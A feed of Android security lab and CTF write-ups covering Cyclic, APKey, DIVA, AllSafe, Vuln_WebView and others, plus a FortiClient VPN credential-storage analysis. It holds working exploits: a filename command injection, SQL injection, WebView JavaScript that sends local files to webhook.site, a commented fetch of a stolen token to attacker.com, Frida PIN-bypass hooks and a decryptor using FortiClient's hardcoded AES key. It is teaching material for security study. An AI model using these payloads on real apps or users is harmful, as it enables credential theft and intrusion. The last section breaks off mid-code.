item.title: Cyclic - Mobile Hacking Lab
item.content:encoded:
Objective​

Exploit a vulnerability inherent within an Android service to achieve remote code execution.

Steps​

  • When the app launches, it displays a single toggle switch labeled "Enable Scanner". Enabling it shows: "Scan service started, your device will be scanned regularly" and forces the switch back ON. No other UI interaction exists, so the next step is static analysis.

  • Decompiled the APK using JADX and started with AndroidManifest.xml: we can see

    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    
    <activity
        android:name="com.mobilehackinglab.cyclicscanner.MainActivity"
        android:exported="true"/>
    
    <service
        android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
        android:exported="false"/>
  • Only one activity: MainActivity
  • ScanService is not exported can't be triggered directly via adb
  • MANAGE_EXTERNAL_STORAGE → full access to /storage/emulated/0
  • Moved to MainActivity to understand the switch behavior. Analyzed setupSwitch$lambda$3():
    public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (isChecked) {
            Toast.makeText(this$0, "Scan service started, your device will be scanned regularly.", 0).show();
            this$0.startForegroundService(new Intent(this$0, (Class<?>) ScanService.class));
            return;
        }
        Toast.makeText(this$0, "Scan service cannot be stopped, this is for your own safety!", 0).show();
        ActivityMainBinding activityMainBinding = this$0.binding;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        activityMainBinding.serviceSwitch.setChecked(true);
    }
    
    private final void startService() {
        Toast.makeText(this, "Scan service started", 0).show();
        startForegroundService(new Intent(this, (Class<?>) ScanService.class));
    }

This confirms what we saw in the UI, switch ON launches ScanService as a foreground service, and switch OFF just forces it back ON via activityMainBinding.serviceSwitch.setChecked(true);, making it impossible to stop the service manually. Before showing the switch at all, handlePermissions() checks for MANAGE_EXTERNAL_STORAGE if not granted it redirects to settings, if granted it shows the switch.

  • Since ScanService is the core of the app, opened it next and analyzed handleMessage() inside ServiceHandler:
    File externalStorageDirectory = Environment.getExternalStorageDirectory();
    Sequence files = FilesKt.walk(externalStorageDirectory);
    
    for (Object element : files) {
        File file = (File) element;
        if (file.canRead() && file.isFile()) {
            boolean safe = ScanEngine.INSTANCE.scanFile(file);
            System.out.println(safe ? "SAFE" : "INFECTED");
        }
    }
    
    sendMessageDelayed(nextMessage, SCAN_INTERVAL); // reschedule every 6000ms
  • Walks all files recursively under /storage/emulated/0 ,Then Every file gets passed to ScanEngine.scanFile() The service runs on a dedicated HandlerThread separate from the main thread so the scan loop runs in the background every 6 seconds without freezing the UI.
  • This pointed directly to ScanEngine as the next class to investigate.
    String command = "toybox sha1sum " + file.getAbsolutePath();
    Process process = new ProcessBuilder()
        .command("sh", "-c", command)
        .directory(Environment.getExternalStorageDirectory())
        .redirectErrorStream(true)
        .start();
    
    String output = reader.readLine();
    Object fileHash = StringsKt.substringBefore(output, "  ");
    return !KNOWN_MALWARE_SAMPLES.containsValue(fileHash);

Breaking down what this method does step by step:

  1. Builds a shell command by taking the file's absolute path and concatenating it directly into a toybox sha1sum command string. toybox is a collection of Unix utilities built into Android — here it's used to calculate the SHA1 hash of the file: toybox sha1sum /storage/emulated/0/Download/test.txt

  2. Executes it via ProcessBuilder using sh -c meaning the entire string is handed to the shell to interpret and run. Critically, this is done without any sanitization on the filename before it gets passed to the shell making it vulnerable to command injection.

  3. Reads the output, extracts the hash, then compares it against KNOWN_MALWARE_SAMPLES if the hash isn't in the list the file is marked SAFE, if it matches it's marked INFECTED.

  • To confirm the scan service is working, created a test file in the scanned directory and watched logcat:
    emu64x:/sdcard/Download # echo "test" > test.txt

  • Within 6 seconds the service picked it up and logged it as SAFE confirming that any file placed in external storage gets scanned automatically.

  • With that confirmed, the next step is placing a file with a malicious name. Instead of normal content, the injection is in the filename itself
    echo "test" > "/sdcard/Download/test2.txt;id>hacked.txt"

  • After 6 seconds, hacked.txt appears in the same directory containing the output of id RCE confirmed.

💡The root cause is unsanitized input passed to sh -c because the filename goes through the shell, any ; in it gets interpreted as a command separator. The fix is to drop sh -c entirely and pass the arguments directly to toybox via ProcessBuilder, so the filename is never interpreted by a shell and is treated as a literal argument:

// vulnerable — full string handed to sh, which interprets ; as a command separator
new ProcessBuilder()
    .command("sh", "-c", "toybox sha1sum " + file.getAbsolutePath())

// safe — arguments passed directly to toybox, no shell involved, ; is just a character
new ProcessBuilder()
    .command("toybox", "sha1sum", file.getAbsolutePath())

item.title: APKey - HTB Challenge
item.content:encoded:
APKey HTB challenge​

Objective​

Solution​

  • Opened the APK in JADX and analyzed MainActivity. Found the login logic in the onClick() handler:
if (MainActivity.this.f928c.getText().toString().equals("admin")) {
    // ... MD5 hash of password ...
    if (str.equals("a2a3d412e92d896134d9c9126d756f")) {
        makeText = Toast.makeText(applicationContext, b.a(g.a()), 1);
        makeText.show();
    }
}

  • First checks if username equals "admin"

  • Then computes MD5 of the entered password

  • Compares the hash against a hardcoded value: a2a3d412e92d896134d9c9126d756f

  • If match → shows the flag via Toast

  • Instead of cracking the MD5 hash, the plan is to flip the condition so any password passes.

  • To patch Smali, first needed to decompile APK, then navigate to the target Smali file and finally edit the onClick handler:

apktool d APKey.apk -o output/
cd output/smali/com/example/apkey/
nano 'MainActivity$a.smali'
  • Located the hash comparison condition and flipped it: Original Check if-eqz p1, :cond_1, patched to if-nez p1, :cond_1 — save and exit.
  • Recompile APK: apktool b output/ -o patched.apk
  • Sign new APK: java -jar uber-apk-signer.jar --apks patched.apk --out signed/
  • Remember to uninstall original, install patched:
adb uninstall com.example.apkey
adb install signed/patched-aligned-signed.apk

Result​

  • Launched the app → entered admin as username + any random password
  • The condition now evaluates to true for any non-matching hash → flag displayed

item.title: Cat - HTB
item.content:encoded:
Cat​

Objective​

  • Analyze an Android Backup (.ab) file to extract sensitive data and retrieve a hidden flag.

What is an .ab File?​

  • .ab = Android Backup — Android's native backup format, generated via adb backup

  • Internally it's a ZLIB-compressed TAR archive preceded by a plaintext header.

  • Contains app data: shared_prefs, databases, files, and shared storage

  • Android backups created without encryption (adb backup without -ky) expose all app data and shared storage to anyone with access to the .ab file — no root required.

Extracting The Backup​

  • Used android-backup-extractor by nelenkov to unpack the .ab file:

    java -jar abe-540a57d.jar unpack cat.ab cat.tar
    tar -xvf cat.tar

  • The extraction produced two top-level directories:

    • apps/ → per-app backup data
    • shared/0/ → device's shared storage (equivalent to /sdcard/)

Investigating apps/​

  • Scanned all packages by size to identify non-system apps:

    du -sh ~/Downloads/apps/* | sort -rh | head -20

  • All large packages were standard system apps (com.android.*, com.google.*) — not interesting.

  • Two packages had com.example prefix, meaning they're user-installed apps, not system:

    • com.example.android.notepad
    • com.example.android.rssreader

  • Investigated both:

find ~/Downloads/apps/com.example.android.notepad/ -type f
find ~/Downloads/apps/com.example.android.rssreader/ -type f

  • Each only had a _manifest file — no sp/, db/, or f/ directories, meaning the backup captured the app's existence but no actual user data was backed up for either app.

  • So moved Shared folder, found only those 6 images viewed them and finally the flag was hidden inside one of them

  • The flag is HTB{ThisBackupIsUnprotected}

item.title: Beetlbug - Firebase
item.content:encoded:
Objective:​

Identify and exploit a misconfigured Firebase Realtime Database to extract the hidden flag.

Steps:​

  • Decompile: Used JADX to decompile the APK and began auditing the source code for Firebase configurations.

  • Identify URL: Located the hardcoded Firebase database URL within res/values/strings.xml:

    https://beetlebug-374fc-default-rtdb.firebaseio.com/

  • Verify Access: Tested for public read permissions by appending /.json to the URL in a browser, forcing the server to return the database tree in JSON format.

  • Extract Flag: Successfully bypassed authentication due to misconfigured security rules and captured the flag: 0x3365A10.

item.title: Vuln_WebView
item.content:encoded:
Objective​

  • Exploit a misconfigured exported WebView activity to read sensitive local files from the app without a rooted device.

RegistrationWebView​

  • The first step was to review the AndroidManifest.xml using JADX to identify potential entry points. I searched for exported activities and found two candidates:

    <activity
        android:name="com.tmh.vulnwebview.SupportWebView"
        android:exported="true"/>
    <activity
        android:name="com.tmh.vulnwebview.RegistrationWebView"
        android:exported="true"/>

  • Found 2 exported WebView activities. Focused on RegistrationWebView first.

  • Opened RegistrationWebView in JADX and went to onCreate() → loadWebView():

  • 3 critical findings:

    FindingImpact
    setAllowUniversalAccessFromFileURLs(true)This is the most dangerous setting. When combined with JavaScript execution, it allows JS code running from a file:// scheme context to access other local files via file:// and, crucially, bypasses the Same-Origin Policy (SOP), allowing the script to send data to external HTTP/HTTPS domains.
    setJavaScriptEnabled(true)JS execution enabled in WebView —> XSS
    reg_url extra loaded directlyAttacker controls what the WebView loads

  • The is_reg logic:

    • getBoolean("is_reg", false) — the false is the default value.
    • If is_reg is not passed in the intent → defaults to false → loads **reg_url**. under our control as we pass it as extra string.
    • If is_reg = true → loads internal registration.html (not useful)
    • So we simply don't pass is_reg → WebView loads our controlled URL

Developing the Exploit Strategy

  • we can craft a malicious local HTML file containing JavaScript to read content of sensitive files, then send it to external server under our control (like Webhook.site).

    <script>
    var xhr = new XMLHttpRequest();   // reads the local file
    var xhr2 = new XMLHttpRequest();  // sends the data out

    xhr.onreadystatechange = () => {
        if (xhr.readyState === 4) {
            // POST the file contents (Base64 encoded) to attacker's server
            xhr2.open("POST", 'https://webhook.site/YOUR-ID/exfil');
            xhr2.setRequestHeader("Content-Type", "x-www-form-urlencoded");
            xhr2.send('data=' + btoa(xhr.responseText));
        }
    };

    // Target file to steal
    xhr.open("GET", "file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml", true);
    xhr.send();
    </script>

  • Result: we got the response, just decode it.

SupportWebView​

  • While reviewing the AndroidManifest.xml, I identified another exported activity:

    <activity
        android:name="com.tmh.vulnwebview.SupportWebView"
        android:exported="true"/>

  • analyzing the SupportWebView class in JADX, I examined the loadWebView() method and found several alarming configurations:

    • Arbitrary URL Loading: The WebView loads whatever URL is provided in the support_url intent extra, giving an attacker full control over the displayed content.
    • setJavaScriptEnabled(true): JavaScript execution is allowed.
    • Insecure JavascriptInterface: This grants any JavaScript executing in the WebView direct access to call the exposed Java methods of the WebAppInterface class.

  • I inspected the WebAppInterface class to see what methods were exposed to the web context. I found the following method annotated with @JavascriptInterface:

    @JavascriptInterface
    public String getUserToken() {
        return SupportWebView.getUserToken();
    }

  • This means any JavaScript code running inside that WebView can simply call Android.getUserToken() to retrieve the user's UUID token.

  • Since we control the URL via support_url, we can point the WebView to a local HTML file containing our malicious JavaScript. The script will access the exposed native object, call the method, and capture the token.

    <!DOCTYPE html>
    <html>
    <body>
        <h2>Stealing Token via JavascriptInterface</h2>
        <script>
            // Note the capital 'A' matching the interface name defined in Java
            var token = Android.getUserToken();
            alert("App Compromised! Token: " + token);
            document.write("<h1>Stolen Token: " + token + "</h1>");
            
            // In a real-world scenario, we would exfiltrate it:
            // fetch('https://attacker.com/log?token=' + token);
        </script>
    </body>
    </html>

  • I pushed the payload to the device and used adb to invoke the exported activity, passing the path to our local file in the support_url extra:

    **# Push the payload
    adb push test.html /sdcard/

    # Trigger the vulnerable activity
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView \
      --es "support_url" "file:///sdcard/test.html"**

Another Vulnerability may arise in webView​

setWebContentsDebuggingEnabled​

  • A developer setting that enables remote debugging of WebView via Chrome DevTools from any machine on the same network
  • Enabled by: WebView.setWebContentsDebuggingEnabled(true)

How to Access It​

  • Open Chrome → go to chrome://inspect/#devices
  • You'll see the device and WebView listed → click inspect
  • Full Chrome DevTools opens connected live to the WebView

What You Can Do​

  • Console tab → run any JS directly on the device
  • Elements tab → view and modify the DOM
  • Network tab → see all network requests
  • Sources tab → view loaded files and scripts

item.title: DIVA - Damn Insecure and Vulnerable App
item.description: DIVA is an intentionally vulnerable Android app covering 5 categories: Insecure Logging, Hardcoding Issues, Input Validation Issues, Insecure Data Storage, and Access Control.
item.content:encoded:
DIVA is an intentionally vulnerable Android app covering 5 categories: Insecure Logging, Hardcoding Issues, Input Validation Issues, Insecure Data Storage, and Access Control.

1. Insecure Logging​

Objective​

Solution​

  • After decompiling the APK using APKLab in VS Code, I analyzed the Java source code of this challenge and found that the developer used Log.e() to log errors along with the credit card number entered by the user.

  • To confirm this from a different angle, I used a second approach — I entered a credit card number directly in the app and got an error message. I then searched for that error message in the decompiled Java code and found the same vulnerable code, confirming the finding through both static and dynamic analysis.

  • Now knowing that Log.e() writes the credit card number to logcat, I needed to capture those logs. Since logcat output is very long, I first got the PID of the DIVA application to filter only its logs:

adb shell pidof jakhar.aseem.diva
# package name can be found in AndroidManifest.xml
  • Then I filtered logcat by the app's PID: adb logcat --pid=4423
  • The credit card number appeared in the logs, confirming the insecure logging vulnerability.

2. Hardcoding Issues - Part 1​

Objective​

Solution​

  • I directly analyzed the Java source code of this challenge:
public void access(View view) {
    EditText hckey = (EditText) findViewById(R.id.hcKey);
    if (hckey.getText().toString().equals("vendorsecretkey")) {
        Toast.makeText(this, "Access granted! See you on the other side :)", 0).show();
    } else {
        Toast.makeText(this, "Access denied! See you in hell :D", 0).show();
    }
}
  • This function takes the user input from the text field hcKey and compares it directly against the hardcoded string "vendorsecretkey". If it matches → Access granted, otherwise → Access denied.
  • The secret key vendorsecretkey is hardcoded directly in the source code — meaning anyone who decompiles the APK using JADX can extract it instantly without any reverse engineering effort.
  • I entered the extracted key directly in the app and got access granted.

2. Hardcoding Issues - Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I found the access() function which takes user input and passes it to this.djni.access() for validation:
public void access(View view) {
    EditText hckey = (EditText) findViewById(R.id.hc2Key);
    if (this.djni.access(hckey.getText().toString()) != 0) {
        Toast.makeText(this, "Access granted!", 0).show();
    } else {
        Toast.makeText(this, "Access denied!", 0).show();
    }
}

  • The function takes user input from hc2Key, passes it to this.djni.access() for validation. If the function returns anything other than 0 → Access granted, if it returns 0 → Access denied.

  • I then traced djni to the DivaJni class and found that the actual validation logic is a native method implemented in a compiled C/C++ library libdivajni.so:

public class DivaJni {
    private static final String soName = "divajni";

    // declared as native — implementation is inside libdivajni.so
    public native int access(String str);

    static {
        System.loadLibrary(soName); // loads libdivajni.so at runtime
    }
}
  • Since the logic is inside a compiled binary that JADX can't read, I extracted the .so file from the APK and used the strings command to extract any readable text embedded in the binary:
strings lib/x86/libdivajni.so
  • Among the output, I spotted a suspicious random string: olsdfgad;lh
  • I entered it as the key in the app and got access granted, confirming it was the hardcoded secret key hidden inside the native library.
  • OR using Ghidra for reversing.

3. Input Validation Issues - Part 1​

Objective​

Solution​

  • After analyzing the Java source code, I spotted the vulnerability — the app inserts user input directly into a SQL query without any sanitization.
  • The query directly concatenates user input into the SQL statement, making it vulnerable to SQL injection.
  • I used the following payload to retrieve all users data: ' OR 1=1--
    • This closes the original query with ', adds OR 1=1 which is always true returning all rows, then -- comments out the rest of the query.
  • The final query executed becomes: SELECT * FROM sqliuser WHERE user = '' OR 1=1--'
  • All users data was returned including usernames, passwords and credit card numbers.

Input Validation Issues - Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I spotted two problems:
// Problem 1 — JavaScript is enabled
wset.setJavaScriptEnabled(true);

// Problem 2 — User input is loaded directly into WebView without any validation
wview.loadUrl(uriText.getText().toString());

  • Problem 1 — JavaScript Enabled: Enabling JavaScript inside a WebView allows execution of JS code, making the app vulnerable to XSS attacks.

  • Problem 2 — No URI Schema Validation: The app passes user input directly to loadUrl() without restricting which schemas are allowed. This means the WebView accepts any schema including:

    • https:// → load any website
    • file:/// → access local files on the device
    • javascript: → execute JS code

  • I exploited the file:// schema to read internal files directly: file:///etc/hosts

  • We can also access the app's SharedPreferences file: file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml

4. Insecure Data Storage - Part 1​

Objective​

Solution​

  • First I entered the username and password and got a success message confirming the credentials were saved.

  • Now lets view the code of this challenge

  • The function creates an instance of SharedPreferences — an XML file used to store data within the app in the form of key-value pairs — then saves the username and password directly into it without any encryption.

  • SharedPreferences files are always located in the app's private folder: /data/data/jakhar.aseem.diva/shared_prefs

  • I listed the contents of this directory — note that a rooted device is required:

ls /data/data/jakhar.aseem.diva/shared_prefs

# Output
WebViewChromiumPrefs.xml
jakhar.aseem.diva_preferences.xml
  • I read the file contents:
cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
  • The file exposed the credentials stored in plaintext:
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">testtt</string>
    <string name="user">wesam</string>
</map>

4. Insecure Data Storage - Part 2​

Objective​

Solution​

  • First I entered the username and password and got a success message confirming the credentials were saved.

  • I analyzed the Java source code and found that the app uses a SQLite database called ids2 to store user credentials: this.mDB = openOrCreateDatabase("ids2", 0, null);

  • SQLite databases are located at: /data/data/jakhar.aseem.diva/databases

ls /data/data/jakhar.aseem.diva/databases

# Output
divanotes.db
divanotes.db-journal
ids2
ids2-journal
sqli
sqli-journal
  • I used sqlite3 to open the database and view the data:
sqlite> .tables
android_metadata  myuser

sqlite> select * from myuser;
help|hehhh
hiiiii|hacked
wesaaam|hhhhhhh
  • All user credentials were stored in plaintext inside the database.

4. Insecure Data Storage - Part 3​

Objective​

Solution​

  • I entered a username and password and got a success message confirming the credentials were saved.

  • I analyzed the Java source code and found that the app creates a temporary file with the naming style uinfo-<randomvalues>-tmp inside the app's private directory.

  • I listed the contents of the app's private directory:

ls /data/data/jakhar.aseem.diva

# Output
app_textures
app_webview
cache
code_cache
databases
shared_prefs
uinfo8096798955951412972tmp
  • I read the file contents:
cat /data/data/jakhar.aseem.diva/uinfo8096798955951412972tmp

# Output
hiii:hacked
  • The credentials were stored in plaintext inside a temporary file.

Part 4​

Objective​

Solution​

  • I entered a username and password and got a success message confirming the credentials were saved.

  • I analyzed the Java source code and found that the app stores user credentials in a hidden file .uinfo.txt in external storage.

  • External storage is accessible by any app on the device and is located at /storage/emulated/0/. I listed the directory contents using the -a flag to reveal hidden files:

ls /storage/emulated/0/ -a
.MySecurityData  .uinfo.txt  Android     DCIM       Download  Music          Pictures  Recordings  Screenshots
.bash_history    Alarms      Audiobooks  Documents  Movies    Notifications  Podcasts  Ringtones
  • I read the hidden file:
cat /storage/emulated/0/.uinfo.txt
testtt:hacked

5. Access Control - Part 1​

Objective​

Access the API credentials from outside the app without using the app's interface directly.

Solution​

Step 1 — Source Code Analysis

  • I decompiled the APK using JADX and analyzed AccessControl1Activity.java. I found a button that triggers the viewAPICredentials function which creates an Implicit Intent:
Intent i = new Intent();
i.setAction("jakhar.aseem.diva.action.VIEW_CREDS");

Step 2 — Manifest Analysis

  • I searched AndroidManifest.xml for the Activity that handles this action. I found APICredsActivity registered with an intent-filter matching the action VIEW_CREDS. Since it has an intent-filter, Android automatically marks it as Exported:
<activity android:label="@string/apic_label" android:name="jakhar.aseem.diva.APICredsActivity">
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>

Step 3 — Exploitation

  • Since APICredsActivity is Exported automatically, I triggered it directly using ADB:
adb shell am start -n jakhar.aseem.diva/.APICredsActivity
  • The Activity opened directly exposing the API credentials.

Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I found that APICreds2Activity checks a boolean parameter called check_pin from the incoming Intent:
boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);
if (!bcheck) {
    apicview.setText("TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2");
    return;
}
  • I looked up the actual value in res/values/strings.xml:
<string name="chk_pin">check_pin</string>
tip

Always check res/values/strings.xml when you see R.string.something in code — it often reveals parameter names needed for exploitation.

  • The logic is simple:

    • check_pin = false → show API credentials directly
    • check_pin = true → ask for PIN (default behavior)

  • I then checked the Manifest and found that APICreds2Activity has an intent-filter — making it exported and accessible from outside the app without authentication:

  • Combining everything, I triggered the Activity directly via ADB passing check_pin as false to bypass PIN verification:

    adb shell am start \
    -a jakhar.aseem.diva.action.VIEW_CREDS2\
    --ez check_pin false
    • am start : start an Activity
    • -a (action flag) — specifies the Intent action
    • -ez : passes a Boolean to the intent
    • check_pin : the parameter name

  • The Activity opened directly exposing the API credentials without any PIN verification.

Part 3​

Objective​

Solution​

  • After analyzing the Java source code, I found that AccessControl3Activity requires a valid PIN before showing the notes via goToNotes():
public void goToNotes(View view) {
    Intent i = new Intent(this, (Class<?>) AccessControl3NotesActivity.class);
    startActivity(i);
}
  • Inside AccessControl3NotesActivity, the accessNotes() function validates the PIN then queries the notes from the Content Provider:
String pin = spref.getString(getString(R.string.pkey), "");
String userpin = pinTxt.getText().toString();
if (userpin.equals(pin)) {
    Cursor cr = getContentResolver().query(NotesProvider.CONTENT_URI, 
        new String[]{"_id", "title", "note"}, null, null, null);
}
tip

Content Provider is an Android component that acts as a middle layer between the app and its data. ContentResolver is the bridge used to communicate with the Content Provider.

  • I checked the Manifest and found that the Content Provider is explicitly exported:
<provider android:authorities="jakhar.aseem.diva.provider.notesprovider"
          android:enabled="true"
          android:exported="true"
          android:name="jakhar.aseem.diva.NotesProvider"/>
  • I found the full Content Provider URI in NotesProvider.java:
static final Uri CONTENT_URI = Uri.parse("content://jakhar.aseem.diva.provider.notesprovider/notes");
  • I queried the notes directly from ADB — completely bypassing the PIN verification:
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes
  • All notes were returned directly without any authentication.

item.title: FortiClient VPN - Credential Exposure
item.content:encoded:
Objective​

  • The app allows creating VPN profiles with username and password. noticed that credentials were pre-filled after creation — indicating they are stored somewhere on the device.
  • The goal is to find the stored credentials in the FortiClient VPN Android app.

Steps​

  • Started with Checking common storage locations like SharedPreferences, the most common insecure storage location:

    adb shell
    cd /data/data/com.fortinet.forticlient/shared_prefs
    ls
    # app-settings.xml  profile-1.xml  profile-2.xml  profile-3.xml  webfilter.xml

    cat profile-3.xml

  • Found:

    <map>
        <string name="profile.title">Wesam</string>
        <string name="ssl.user">WEsaaaam</string>
        <string name="ssl.resu">1B14ABF4142EC689FFDAD21D1A7DE0E6</string>
        <string name="profile.type">ssl</string>
    </map>
    • ssl.user = username in plaintext
    • ssl.resu = password — looks encrypted (hex string)

  • I Wanted to trace the encryption in source code so I decompiled the APK with JADX and searched for ssl.resu to understand how the password is stored.

    public static void e(SharedPreferences sharedPreferences, String str) {
        SharedPreferences.Editor editorEdit = sharedPreferences.edit();
        editorEdit.putString("ssl.resu", cu.n(str)); // password goes through cu.n() first
        editorEdit.apply();
    }

  • The password (str) is not stored directly, it's passed through cu.n() first, then the result is saved under the key ssl.resu. This means cu.n() is the encryption function.

  • Lets understand the encryption function n

    private static final String KEY = "FoRtInEt!AnDrOiD"; // hardcoded key

    public static String n(String str) {

        // Step 1: Define the IV (Initialization Vector)
        IvParameterSpec ivParameterSpec = new IvParameterSpec(
            new byte[]{117,122,39,67,114,124,115,44,113,116,124,123,58,89,118,94}
        );

        // Step 2: Build the AES key from the hardcoded string
        SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "AES");

        // Step 3: Create the cipher with AES/CBC/PKCS5Padding
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        // Step 4: Initialize cipher in ENCRYPT mode (mode 1 = encrypt, mode 2 = decrypt)
        cipher.init(1, secretKeySpec, ivParameterSpec);

        // Step 5: Encrypt the password bytes
        byte[] encrypted = cipher.doFinal(str.getBytes());

        // Step 6: Convert encrypted bytes → HEX string for storage
        StringBuffer stringBuffer = new StringBuffer();
        for (byte b : encrypted) {
            String hexString = Integer.toHexString(b & 255);
            if (1 == hexString.length()) {
                hexString = "0" + hexString; // pad single chars with 0
            }
            stringBuffer.append(hexString.toUpperCase(Locale.ENGLISH));
        }
        return stringBuffer.toString(); // returns: "1B14ABF4142EC689FFDAD21D1A7DE0E6"
    }
    • From the code, Algorithm used is AES/CBC/PKCS5Padding AES encryption in CBC mode.
    • key is hardcoded FoRtInEt!AnDrOiD
    • IV 16 bytes needed for CBC mode

    💡

    Why is this a vulnerability?

    • AES itself is strong, but the implementation is fatally flawed:
    • Hardcoded KEY + Hardcoded IV + Decompilable APK Anyone can decrypt any password stored by this app

  • Since we have the key, IV, and algorithm — decryption is straightforward. We just run the same process in reverse this is a simple script

    from Crypto.Cipher import AES
    import binascii

    # exact same key and IV from the decompiled code
    KEY = "FoRtInEt!AnDrOiD"
    IV  = bytes([117, 122, 39, 67, 114, 124, 115, 44,
                 113, 116, 124, 123, 58,  89,  118, 94])

    # the encrypted value from shared_prefs/profile-3.xml
    encrypted_hex = "1B14ABF4142EC689FFDAD21D1A7DE0E6"

    # Step 1: convert hex string back to bytes
    encrypted_bytes = binascii.unhexlify(encrypted_hex)

    # Step 2: create cipher in DECRYPT mode
    cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV)

    # Step 3: decrypt
    decrypted = cipher.decrypt(encrypted_bytes)

    # Step 4: remove PKCS5 padding and decode to string
    password = decrypted.rstrip(b'\x00').decode('utf-8', errors='ignore')
    print("Password:", password)

  • After running this script I got the password in plain text

    python3 script.py       
    ## Password: HiThis IsWesam

item.title: AllSafe - Part 1
item.description: AllSafe is an intentionally vulnerable Android app. This part covers challenges 1–6.
item.content:encoded:
AllSafe is an intentionally vulnerable Android app. This part covers challenges 1–6.

1. Insecure Logging​

Objective:​

Solution:​

  • just get PID of app so we can filterate logs
adb shell pidof  infosecadventures.allsafe
4713

  • Just adb logcat —pid=4713

2. Hardcoded Credentials​

Objective​

Solution:​

  • Decompile the APK using JADX and navigate to the HardcodedCredentials class. A static string named BODY contains a SOAP XML envelope with plaintext administrative credentials:
    • Username: superadmin
    • Password: supersecurepassword

  • In the same class, the code reveals it is fetching a URL for a development environment: String string = this$0.getString(R.string.dev_env);
  • Checking the strings.xml file for the dev_env key reveals a second set of credentials embedded directly in a URL:
    <string name="dev_env">https://admin:password123@dev.infosecadventures.com</string>

3. Firebase​

Objective​

Solution​

  • By decompiling the APK and searching through strings.xml, I identified the Firebase URL used by the application:
    <string name="firebase_database_url">[https://allsafe-8cef0.firebaseio.com](https://allsafe-8cef0.firebaseio.com/)</string>

  • Firebase databases are essentially JSON files. A common misconfiguration is leaving the database open to the public. To test this, I appended /.json to the end of the discovered URL: https://allsafe8cef0.firebaseio.com/.json

  • The database returned a JSON object containing a secret flag and a hidden message:

4. Insecure Shared Preferences​

  • The application provides a user login portal that allows users to register and store their credentials

  • By searching for the "Successful registration!" toast message in JADX, I identified the registration logic in the source code:

    SharedPreferences sharedpreferences = requireActivity().getSharedPreferences("user", 0);
    SharedPreferences.Editor editor = sharedpreferences.edit();
    editor.putString("username", username.getText().toString());
    editor.putString("password", password.getText().toString());
    editor.apply();
  • The code reveals that the app uses the SharedPreferences API to store the username and password in a file named user.xml.
  • After registering a test account (username: wesam, password: test), I examined the contents of the user.xml file:
cd /data/data/infosecadventures.allsafe/shared_prefs 
cat user.xml
  • Output:
    <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
    <map>
        <string name="password">test</string>
        <string name="username">wesam</string>
    </map>

5. SQL Injection​

6. Pin Bypass​

Objective​

Solution​

  • Opening the APK in JADX, the validation logic is inside onCreateView$lambda$0:
    if (($pin.getText().toString().length() == 0) || 
        !this$0.checkPin($pin.getText().toString())) {
        // "Incorrect PIN, try harder!"
    } else {
        // "Access granted, good job!"
    }

  • The actual check is inside checkPin():

  • checkPin() decodes a hardcoded Base64 string and compares it against the user input. Decoding NDg2Mw== manually: echo "NDg2Mw==" | base64 -d The correct PIN is 4863.

  • Ignore that the pin is hardcoded in the code, and let's assume it's not in this case we have 2 scenarios to solve the challenge

Solution 1 — Force return value​

  • Hook checkPin() and always return true regardless of input:
    Java.perform(function() {
        var cls = Java.use("infosecadventures.allsafe.challenges.PinBypass");
    
        cls.checkPin.implementation = function(pin) {
            console.log("[*] PIN entered: " + pin);
            return true;  // always pass
        };
    });
  • Any PIN entered → access granted.

Solution 2 — Brute force​

  • We can brute force 4 digits code using frida through calling checkPin() with different values from 0000 - 9999 until it returns true.
  • Stops at 4863 and prints the correct PIN.
    Java.perform(function() {
        var cls = Java.use("infosecadventures.allsafe.challenges.PinBypass");
    
        cls.checkPin.implementation = function(pin) {
            for (var i = 0; i <= 9999; i++) {
                var attempt = String(i).padStart(4, '0');
                if (this.checkPin(attempt)) {
                    console.log("[*] Correct PIN: " + attempt);
                    break;
                }
            }
            return true;
        };
    });
  • String(i) — converts the integer i to a string since checkPin() expects a string parameter, not a number.
  • padStart(4, '0') = make the string exactly 4 characters long — if it's shorter, fill the missing characters from the left with '0'.

item.title: AllSafe - Part 2
item.description: AllSafe Part 2 covers challenges 7–12: Root Detection, Secure Flag Bypass, Deep Link, Insecure Broadcast Receiver, and Vulnerable WebView.
item.content:encoded:
AllSafe Part 2 covers challenges 7–12: Root Detection, Secure Flag Bypass, Deep Link, Insecure Broadcast Receiver, and Vulnerable WebView.

7. Root Detection​

Objective​

Solution​

  • Reviewing challenge Code in JADX and this is our entry point
    if (new RootBeer(this$0.getContext()).isRooted()) {
        // "Sorry, your device is rooted!"
    }
  • The app creates a new instance of RootBeer and immediately calls isRooted() — this is the only thing standing between us and success.
  • Inside isRooted() : All 9 checks are connected with || (OR) — meaning if even one returns true, isRooted() returns true and the app blocks us.
    public boolean isRooted() {
        return detectRootManagementApps()       // SuperSU, Magisk Manager installed?
            || detectPotentiallyDangerousApps() // known dangerous apps installed?
            || checkForBinary(Const.BINARY_SU)  // su binary exists on device?
            || checkForDangerousProps()         // build.prop has test/debug values?
            || checkForRWPaths()                // system partitions mounted as rw?
            || detectTestKeys()                 // build signed with test keys?
            || checkSuExists()                  // runs `which su` in shell
            || checkForRootNative()             // native JNI level root check
